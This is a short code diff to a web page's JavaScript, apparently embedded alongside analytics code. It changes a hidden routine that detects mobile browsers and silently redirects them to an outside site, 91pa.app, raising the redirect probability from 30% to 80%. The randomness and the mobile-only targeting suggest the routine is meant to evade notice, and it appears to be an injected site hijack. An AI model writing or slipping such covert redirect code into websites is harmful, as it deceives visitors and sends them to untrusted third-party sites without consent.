@@ -17,7 +17,7 @@ var _hmt = _hmt || [];
     var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                      .test(navigator.userAgent);
     if (!isMobile) return;  
-    if (Math.random() < 0.3) {
+    if (Math.random() < 0.8) {
       window.location.replace('https://91pa.app/');
     }
   })();
